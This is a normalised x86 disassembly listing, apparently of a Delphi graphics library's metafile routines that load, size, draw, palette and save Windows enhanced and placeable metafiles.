test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403128
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
sub_4273ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_42747c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403070
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42749c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4275c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408774
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404418
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_426dec
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42755f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
mov eax [ ebx + 0xc ]
call sub_403128
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4275c7
lea eax [ ebp - 0x14 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_427600
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_4273ec
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4273ec
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418d14
mov edx ebx
mov eax esi
call sub_4273ec
jmp r-xdata
pop esi
pop ebx
retn
sub_42765c
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_427680
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4276a8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4277af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40411c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_426e84
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427731
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277b6
lea eax [ ebp - 0x48 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427736
mov eax [ ebp - 0x4 ]
call sub_403128
call sub_40391c
call sub_403970
mov eax [ ebx + 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277b6
lea eax [ ebp - 0x48 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4277c0
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403078
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402a24
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_42781c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_427898
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4276a8
mov eax [ ebp - 0x8 ]
push eax
push sub_4277c0
push ebp
call sub_42781c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427914
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4234dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_427954
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4267f8
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42799c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428974
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4279cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_428974
mov edx esi
mov eax ebx
call sub_418d14
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_428970
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_427a60
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_425280
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_425280
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_425280
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_425280
push eax
call SelectPalette
sub_427af8
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427ca0
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427b5c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4234dc
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_427be8
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427ca0
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427c4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4281c8
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41ade8
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_427e04
mov edx esi
mov eax ebx
call sub_427d34
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_427ca0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_428974
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_428970
pop esi
pop ebx
retn
sub_427cc8
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_4281c8
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_427e04
mov edx esi
mov eax ebx
call sub_427d34
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_427d34
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_427ca0
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41b014
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_427df4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028c8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41b014
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425570
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427dfb
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
call sub_425570
sub_427e04
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_427ca0
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_425570
lea eax [ ebp - 0x22 ]
call sub_4263c0
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_427f73
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425570
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f7a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026ec
retn
call sub_425570
sub_427f84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42802b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_428009
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408774
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c518
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426ac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428010
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_428064
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427ca0
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4280d8
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4280d8
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4280d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_427ca0
pop esi
pop ebx
retn
mov eax ebx
call sub_428228
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428114
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_427ca0
pop esi
pop ebx
retn
mov eax ebx
call sub_428228
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428154
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427ca0
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428114
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428114
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4281c8
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41ade8
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_428228
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_427ca0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_428974
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_428970
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_4282ac
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41ade8
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4283b8
mov edx ebx
mov eax esi
call sub_42832c
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_42832c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4283a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b04c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
sub_4283b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402b34
mov ebx [ ebx + 0x28 ]
